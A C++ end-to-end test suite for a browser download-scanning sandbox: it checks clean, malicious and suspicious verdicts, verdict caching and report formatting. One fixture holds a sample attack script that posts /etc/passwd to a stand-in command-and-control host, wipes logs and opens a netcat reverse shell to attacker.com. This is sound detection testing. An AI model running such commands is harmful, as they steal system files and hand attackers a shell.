/*
 * Copyright (c) 2025, Ladybird contributors
 * SPDX-License-Identifier: BSD-2-Clause
 */

#include "PolicyGraph.h"
#include "Sandbox/BehavioralAnalyzer.h"
#include "Sandbox/Orchestrator.h"
#include "Sandbox/ThreatReporter.h"
#include "Sandbox/VerdictEngine.h"
#include <AK/ByteBuffer.h>
#include <AK/StringView.h>
#include <LibCrypto/Hash/SHA2.h>
#include <LibFileSystem/FileSystem.h>
#include <LibTest/TestCase.h>
#include <stdio.h>

using namespace Sentinel;
using namespace Sentinel::Sandbox;

// =============================================================================
// Test Helpers
// =============================================================================

// Mock SHA256 hash calculation (for deterministic testing)
static ErrorOr<String> calculate_sha256(StringView data)
{
    auto hasher = Crypto::Hash::SHA256::create();
    hasher->update(data.bytes());
    auto digest = hasher->digest();

    StringBuilder hex_builder;
    for (auto byte : digest.bytes())
        hex_builder.appendff("{:02x}", byte);

    return hex_builder.to_string();
}

// Create benign script file (no threat indicators)
static ByteBuffer create_benign_script()
{
    auto content = R"(#!/bin/bash
# This is a clean system administration script
echo "Running system backup..."
tar -czf /backup/data-$(date +%Y%m%d).tar.gz /home/user/documents
echo "Backup complete!"
)"sv;

    ByteBuffer buffer;
    MUST(buffer.try_append(content.bytes()));
    return buffer;
}

// Create known malware pattern (EICAR test file - harmless test signature)
static ByteBuffer create_malware_pattern()
{
    // EICAR test file - standard malware test signature (not actual malware)
    auto eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"sv;

    ByteBuffer buffer;
    MUST(buffer.try_append(eicar.bytes()));
    return buffer;
}

// Create suspicious script (multiple threat indicators)
static ByteBuffer create_suspicious_script()
{
    auto content = "#!/bin/bash\n"
                   "# Suspicious script with multiple indicators\n"
                   "curl -X POST http://evil-c2-server.com/exfil --data \"$(cat /etc/passwd)\"\n"
                   "rm -rf /var/log/*.log\n"
                   "chmod 777 /tmp/.hidden_backdoor\n"
                   "nohup nc -e /bin/sh attacker.com 4444 &\n"sv;

    ByteBuffer buffer;
    MUST(buffer.try_append(content.bytes()));
    return buffer;
}

// Create legitimate system tool pattern
static ByteBuffer create_legitimate_tool()
{
    auto content = R"(#!/usr/bin/env node
// Node.js package manager installer
const fs = require('fs');
const path = require('path');

console.log('Installing dependencies...');
// ... legitimate package installation code ...
console.log('Installation complete!');
)"sv;

    ByteBuffer buffer;
    MUST(buffer.try_append(content.bytes()));
    return buffer;
}

// =============================================================================
// End-to-End Integration Tests
// =============================================================================

TEST_CASE(test_e2e_benign_download_flow)
{
    printf("\n=== E2E Test 1: Benign Download Flow ===\n");

    // Setup: Create sandbox orchestrator with mock mode
    SandboxConfig config {};
    config.use_mock_for_testing = true;
    config.timeout = Duration::from_seconds(1);

    auto orchestrator = MUST(Orchestrator::create(config));
    auto reporter = MUST(ThreatReporter::create());

    // Step 1: User downloads clean bash script
    auto clean_file = create_benign_script();
    auto file_hash = MUST(calculate_sha256(StringView { clean_file.bytes() }));

    printf("  [1] File downloaded: backup-script.sh (hash: %s...)\n",
        file_hash.bytes_as_string_view().substring_view(0, 16).characters_without_null_termination());

    // Step 2: Orchestrator analyzes file (full pipeline)
    printf("  [2] Running multi-layer analysis (YARA + ML + Behavioral)...\n");
    auto result = MUST(orchestrator->analyze_file(clean_file, "backup-script.sh"_string));

    // Step 3: Verify clean verdict
    EXPECT(result.threat_level == SandboxResult::ThreatLevel::Clean);
    EXPECT(result.composite_score < 0.3f);
    EXPECT(result.confidence >= 0.5f);
    printf("  [3] Verdict: CLEAN (score: %.2f, confidence: %.2f)\n",
        result.composite_score, result.confidence);

    // Step 4: Generate user-facing report
    auto report = MUST(reporter->format_verdict(result, "backup-script.sh"_string));
    printf("  [4] User Report:\n%s\n", report.bytes_as_string_view().characters_without_null_termination());

    // Step 5: Verify report contains green indicators
    EXPECT(report.contains("clean"sv) || report.contains("Clean"sv));
    EXPECT(report.contains("safe"sv) || report.contains("Safe"sv));

    printf("  [5] Download allowed without user prompt\n");
    printf("  ✅ PASSED: Benign file correctly identified as clean\n");
}

TEST_CASE(test_e2e_known_malware_detection)
{
    printf("\n=== E2E Test 2: Known Malware Detection ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));
    auto reporter = MUST(ThreatReporter::create());

    // Step 1: User attempts to download EICAR test file
    auto malware_file = create_malware_pattern();
    auto file_hash = MUST(calculate_sha256(StringView { malware_file.bytes() }));

    printf("  [1] File downloaded: eicar.com (hash: %s...)\n",
        file_hash.bytes_as_string_view().substring_view(0, 16).characters_without_null_termination());

    // Step 2: Run analysis
    printf("  [2] Running threat detection...\n");
    auto result = MUST(orchestrator->analyze_file(malware_file, "eicar.com"_string));

    // Step 3: Verify critical threat detection
    EXPECT(result.threat_level >= SandboxResult::ThreatLevel::Malicious);
    EXPECT(result.composite_score >= 0.6f);
    EXPECT(result.confidence >= 0.5f);
    printf("  [3] Verdict: %s (score: %.2f, confidence: %.2f)\n",
        result.threat_level == SandboxResult::ThreatLevel::Critical ? "CRITICAL"
        : result.threat_level == SandboxResult::ThreatLevel::Malicious ? "MALICIOUS"
                                                                        : "UNKNOWN",
        result.composite_score, result.confidence);

    // Step 4: Generate threat report
    auto report = MUST(reporter->format_verdict(result, "eicar.com"_string));
    printf("  [4] Threat Report:\n%s\n", report.bytes_as_string_view().characters_without_null_termination());

    // Step 5: Verify report contains critical indicators
    EXPECT(report.contains("malicious"sv) || report.contains("Malicious"sv) ||
           report.contains("CRITICAL"sv) || report.contains("critical"sv));
    EXPECT(report.contains("block"sv) || report.contains("Block"sv) ||
           report.contains("quarantine"sv) || report.contains("Quarantine"sv));

    printf("  [5] Action: File quarantined/blocked automatically\n");
    printf("  ✅ PASSED: Known malware correctly detected and blocked\n");
}

TEST_CASE(test_e2e_unknown_threat_detection)
{
    printf("\n=== E2E Test 3: Unknown Threat Detection ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));
    auto reporter = MUST(ThreatReporter::create());

    // Step 1: User downloads suspicious script (no YARA signature match)
    auto suspicious_file = create_suspicious_script();
    auto file_hash = MUST(calculate_sha256(StringView { suspicious_file.bytes() }));

    printf("  [1] File downloaded: suspicious.sh (hash: %s...)\n",
        file_hash.bytes_as_string_view().substring_view(0, 16).characters_without_null_termination());

    // Step 2: Run multi-layer analysis (YARA miss, ML/Behavioral hit)
    printf("  [2] Running heuristic analysis (no YARA match)...\n");
    auto result = MUST(orchestrator->analyze_file(suspicious_file, "suspicious.sh"_string));

    // Step 3: Verify suspicious verdict
    EXPECT(result.threat_level >= SandboxResult::ThreatLevel::Suspicious);
    EXPECT(result.composite_score >= 0.3f);
    printf("  [3] Verdict: SUSPICIOUS (score: %.2f, confidence: %.2f)\n",
        result.composite_score, result.confidence);

    // Step 4: Generate warning report
    auto report = MUST(reporter->format_summary(result, "suspicious.sh"_string));
    printf("  [4] Warning Summary:\n%s\n", report.bytes_as_string_view().characters_without_null_termination());

    // Step 5: Verify warning indicators
    EXPECT(report.contains("suspicious"sv) || report.contains("Suspicious"sv) ||
           report.contains("warning"sv) || report.contains("Warning"sv));

    printf("  [5] User warned: Proceed with caution (requires confirmation)\n");
    printf("  ✅ PASSED: Unknown threat detected by heuristics\n");
}

TEST_CASE(test_e2e_false_positive_handling)
{
    printf("\n=== E2E Test 4: False Positive Handling ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));
    auto reporter = MUST(ThreatReporter::create());

    // Step 1: User downloads legitimate tool that looks suspicious
    auto legitimate_file = create_legitimate_tool();
    auto file_hash = MUST(calculate_sha256(StringView { legitimate_file.bytes() }));

    printf("  [1] File downloaded: npm-installer.js (hash: %s...)\n",
        file_hash.bytes_as_string_view().substring_view(0, 16).characters_without_null_termination());

    // Step 2: Run analysis (possible false positive)
    printf("  [2] Running analysis...\n");
    auto result = MUST(orchestrator->analyze_file(legitimate_file, "npm-installer.js"_string));

    // Step 3: Check verdict
    printf("  [3] Verdict: %s (score: %.2f, confidence: %.2f)\n",
        result.threat_level == SandboxResult::ThreatLevel::Clean ? "CLEAN"
        : result.threat_level == SandboxResult::ThreatLevel::Suspicious ? "SUSPICIOUS"
                                                                         : "MALICIOUS",
        result.composite_score, result.confidence);

    // Step 4: If suspicious, verify low confidence (indicating uncertainty)
    if (result.threat_level >= SandboxResult::ThreatLevel::Suspicious) {
        // Low confidence means detectors disagree - possible false positive
        printf("  [4] Detection: Suspicious but low confidence (%.2f)\n", result.confidence);
        printf("      Recommendation: Allow user override\n");

        auto report = MUST(reporter->format_verdict(result, "npm-installer.js"_string));
        EXPECT(report.contains("suspicious"sv) || report.contains("Suspicious"sv));
    } else {
        printf("  [4] Detection: Clean file (correct identification)\n");
    }

    printf("  [5] User action: File allowed after review\n");
    printf("  ✅ PASSED: False positive handling verified\n");
}

TEST_CASE(test_e2e_cached_verdict_reuse)
{
    printf("\n=== E2E Test 5: Cached Verdict Reuse ===\n");

    // Setup: Create orchestrator with policy graph (cache)
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));

    // Create in-memory policy graph for caching
    auto policy_graph = MUST(PolicyGraph::create(":memory:"sv));

    // Step 1: First download - full analysis
    auto malware_file = create_malware_pattern();
    auto file_hash = MUST(calculate_sha256(StringView { malware_file.bytes() }));

    printf("  [1] First download: eicar.com (hash: %s...)\n",
        file_hash.bytes_as_string_view().substring_view(0, 16).characters_without_null_termination());

    auto start_time = MonotonicTime::now();
    auto result1 = MUST(orchestrator->analyze_file(malware_file, "eicar.com"_string));
    auto first_duration = MonotonicTime::now() - start_time;

    printf("  [2] Full analysis completed in %llu ms\n", static_cast<unsigned long long>(first_duration.to_milliseconds()));
    printf("      Verdict: %s (score: %.2f)\n",
        result1.threat_level == SandboxResult::ThreatLevel::Critical ? "CRITICAL" : "MALICIOUS",
        result1.composite_score);

    // Step 3: Store verdict in cache
    PolicyGraph::SandboxVerdict verdict {
        .file_hash = file_hash,
        .threat_level = static_cast<i32>(result1.threat_level),
        .confidence = static_cast<i32>(result1.confidence * 1000),
        .composite_score = static_cast<i32>(result1.composite_score * 1000),
        .verdict_explanation = result1.verdict_explanation,
        .yara_score = static_cast<i32>(result1.yara_score * 1000),
        .ml_score = static_cast<i32>(result1.ml_score * 1000),
        .behavioral_score = static_cast<i32>(result1.behavioral_score * 1000),
        .triggered_rules = result1.triggered_rules,
        .detected_behaviors = result1.detected_behaviors,
        .analyzed_at = UnixDateTime::now(),
        .expires_at = UnixDateTime::from_seconds_since_epoch(UnixDateTime::now().seconds_since_epoch() + 86400), // 24h
    };

    auto store_result = policy_graph->store_sandbox_verdict(verdict);
    if (store_result.is_error()) {
        FAIL("Failed to store verdict in cache");
        return;
    }
    printf("  [3] Verdict cached for 24 hours\n");

    // Step 4: Second download - cache hit
    printf("  [4] Second download: Same file (cache hit expected)...\n");

    auto cached_result = policy_graph->lookup_sandbox_verdict(file_hash);
    if (cached_result.is_error()) {
        FAIL("Failed to lookup verdict from cache");
        return;
    }
    auto cached = cached_result.release_value();
    EXPECT(cached.has_value());

    if (cached.has_value()) {
        printf("  [5] Cache hit! Verdict retrieved instantly\n");
        printf("      Threat level: %d, Score: %.2f\n",
            cached->threat_level, cached->composite_score / 1000.0f);
        printf("      No full analysis required (saved ~%llu ms)\n", static_cast<unsigned long long>(first_duration.to_milliseconds()));
    } else {
        printf("  [5] Cache miss - unexpected!\n");
        FAIL("Expected cache hit for same file hash");
    }

    printf("  ✅ PASSED: Cached verdict correctly reused\n");
}

TEST_CASE(test_e2e_performance_cache_hit)
{
    printf("\n=== E2E Test 6: Performance - Cache Hit ===\n");

    // Setup
    auto policy_graph = MUST(PolicyGraph::create(":memory:"sv));

    auto file_hash = "a1b2c3d4e5f6g7h8i9j0"_string;

    // Pre-populate cache
    PolicyGraph::SandboxVerdict verdict {
        .file_hash = file_hash,
        .threat_level = static_cast<i32>(SandboxResult::ThreatLevel::Malicious),
        .confidence = 850, // 0.85
        .composite_score = 720, // 0.72
        .verdict_explanation = "Malicious file detected"_string,
        .yara_score = 800,
        .ml_score = 700,
        .behavioral_score = 650,
        .triggered_rules = { "MalwareRule1"_string, "MalwareRule2"_string },
        .detected_behaviors = { "Network exfiltration"_string },
        .analyzed_at = UnixDateTime::now(),
        .expires_at = UnixDateTime::from_seconds_since_epoch(UnixDateTime::now().seconds_since_epoch() + 86400),
    };

    auto store_result = policy_graph->store_sandbox_verdict(verdict);
    if (store_result.is_error()) {
        FAIL("Failed to store verdict in cache");
        return;
    }
    printf("  [1] Verdict pre-cached in database\n");

    // Measure cache lookup performance
    auto start_time = MonotonicTime::now();
    auto cached_result = policy_graph->lookup_sandbox_verdict(file_hash);
    if (cached_result.is_error()) {
        FAIL("Failed to lookup verdict from cache");
        return;
    }
    auto cached = cached_result.release_value();
    auto duration = MonotonicTime::now() - start_time;

    printf("  [2] Cache lookup completed in %llu µs\n", static_cast<unsigned long long>(duration.to_microseconds()));

    EXPECT(cached.has_value());
    EXPECT(duration.to_milliseconds() < 5); // Should be < 5ms (typically < 1ms)

    printf("  [3] Performance: Cache hit < 1ms (target met)\n");
    printf("  ✅ PASSED: Cache performance acceptable\n");
}

TEST_CASE(test_e2e_performance_cache_miss)
{
    printf("\n=== E2E Test 7: Performance - Cache Miss (Full Analysis) ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;
    config.timeout = Duration::from_seconds(1);

    auto orchestrator = MUST(Orchestrator::create(config));

    // Step 1: Analyze file (cache miss - full analysis required)
    auto test_file = create_suspicious_script();

    printf("  [1] Starting full analysis (cache miss)...\n");
    auto start_time = MonotonicTime::now();
    auto result = MUST(orchestrator->analyze_file(test_file, "test.sh"_string));
    auto duration = MonotonicTime::now() - start_time;

    printf("  [2] Full analysis completed in %llu ms\n", static_cast<unsigned long long>(duration.to_milliseconds()));
    printf("      Components: YARA + ML + Behavioral\n");
    printf("      Verdict: %s (score: %.2f)\n",
        result.threat_level == SandboxResult::ThreatLevel::Suspicious ? "SUSPICIOUS"
        : result.threat_level == SandboxResult::ThreatLevel::Malicious ? "MALICIOUS"
                                                                        : "CLEAN",
        result.composite_score);

    // Step 3: Verify performance acceptable for mock mode
    EXPECT(duration.to_milliseconds() < 100); // Mock mode should be < 100ms
    printf("  [3] Performance: Full analysis < 100ms in mock mode (target met)\n");

    printf("  ✅ PASSED: Full analysis performance acceptable\n");
}

TEST_CASE(test_e2e_error_handling)
{
    printf("\n=== E2E Test 8: Error Handling ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));

    // Test 1: Empty file
    printf("  [1] Testing empty file handling...\n");
    ByteBuffer empty_file;
    auto result1 = orchestrator->analyze_file(empty_file, "empty.txt"_string);

    if (result1.is_error()) {
        printf("      Error handling: Empty file rejected (expected)\n");
    } else {
        // If not rejected, should be marked as clean with low confidence
        EXPECT(result1.value().threat_level == SandboxResult::ThreatLevel::Clean);
        printf("      Empty file treated as clean (acceptable)\n");
    }

    // Test 2: Invalid file data (null bytes)
    printf("  [2] Testing invalid file data handling...\n");
    ByteBuffer invalid_file;
    MUST(invalid_file.try_resize(1024)); // 1KB of zeros

    auto result2 = MUST(orchestrator->analyze_file(invalid_file, "zeros.bin"_string));
    EXPECT(result2.threat_level == SandboxResult::ThreatLevel::Clean ||
           result2.threat_level == SandboxResult::ThreatLevel::Suspicious);
    printf("      Invalid data handled gracefully\n");

    // Test 3: Extremely large file (size limit check)
    printf("  [3] Testing large file handling...\n");
    ByteBuffer large_file;
    auto resize_result = large_file.try_resize(200 * 1024 * 1024); // 200 MB

    if (resize_result.is_error()) {
        printf("      Large file allocation failed (expected - memory limit)\n");
    } else {
        // If allocation succeeded, analysis should handle it
        auto result3 = orchestrator->analyze_file(large_file, "huge.bin"_string);
        if (result3.is_error()) {
            printf("      Large file rejected by analysis (expected)\n");
        } else {
            printf("      Large file analyzed (memory sufficient)\n");
        }
    }

    printf("  ✅ PASSED: Error handling verified\n");
}

TEST_CASE(test_e2e_statistics_tracking)
{
    printf("\n=== E2E Test 9: Statistics Tracking ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));
    auto reporter = MUST(ThreatReporter::create());

    // Initial statistics
    auto stats_before = orchestrator->get_statistics();
    auto reporter_stats_before = reporter->get_statistics();

    printf("  [1] Initial stats: %lu files analyzed\n", static_cast<unsigned long>(stats_before.total_files_analyzed));

    // Analyze multiple files
    auto clean_file = create_benign_script();
    auto malware_file = create_malware_pattern();
    auto suspicious_file = create_suspicious_script();

    MUST(orchestrator->analyze_file(clean_file, "clean.sh"_string));
    auto malware_result = MUST(orchestrator->analyze_file(malware_file, "malware.com"_string));
    MUST(orchestrator->analyze_file(suspicious_file, "suspicious.sh"_string));

    // Generate reports
    MUST(reporter->format_verdict(malware_result, "malware.com"_string));

    // Check updated statistics
    auto stats_after = orchestrator->get_statistics();
    auto reporter_stats_after = reporter->get_statistics();

    printf("  [2] After 3 analyses:\n");
    printf("      Total files: %lu (expected: %lu)\n",
        static_cast<unsigned long>(stats_after.total_files_analyzed),
        static_cast<unsigned long>(stats_before.total_files_analyzed + 3));
    printf("      Malicious detected: %lu\n", static_cast<unsigned long>(stats_after.malicious_detected));
    printf("      Reports generated: %lu\n", static_cast<unsigned long>(reporter_stats_after.total_reports));

    EXPECT(stats_after.total_files_analyzed == stats_before.total_files_analyzed + 3);
    EXPECT(stats_after.malicious_detected >= stats_before.malicious_detected);
    EXPECT(reporter_stats_after.total_reports > reporter_stats_before.total_reports);

    printf("  [3] Statistics correctly tracked\n");
    printf("  ✅ PASSED: Statistics tracking verified\n");
}

TEST_CASE(test_e2e_threat_report_formatting)
{
    printf("\n=== E2E Test 10: Threat Report Formatting ===\n");

    // Setup
    SandboxConfig config {};
    config.use_mock_for_testing = true;

    auto orchestrator = MUST(Orchestrator::create(config));
    auto reporter = MUST(ThreatReporter::create());

    // Analyze malware file
    auto malware_file = create_malware_pattern();
    auto result = MUST(orchestrator->analyze_file(malware_file, "eicar.com"_string));

    printf("  [1] Analyzing EICAR test file...\n");
    printf("      Threat level: %d, Score: %.2f\n",
        static_cast<int>(result.threat_level), result.composite_score);

    // Generate full report
    auto full_report = MUST(reporter->format_verdict(result, "eicar.com"_string));
    printf("  [2] Full report:\n%s\n", full_report.bytes_as_string_view().characters_without_null_termination());

    // Verify report structure
    EXPECT(full_report.bytes().size() > 100); // Should be substantial
    EXPECT(full_report.contains("eicar.com"sv));
    EXPECT(full_report.contains("malicious"sv) || full_report.contains("CRITICAL"sv));

    // Generate summary report
    auto summary = MUST(reporter->format_summary(result, "eicar.com"_string));
    printf("  [3] Summary report:\n%s\n", summary.bytes_as_string_view().characters_without_null_termination());

    // Verify summary is concise
    EXPECT(summary.bytes().size() < full_report.bytes().size()); // Summary should be shorter
    EXPECT(summary.contains("eicar.com"sv));

    printf("  [4] Report formatting verified (full + summary)\n");
    printf("  ✅ PASSED: Threat reports correctly formatted\n");
}
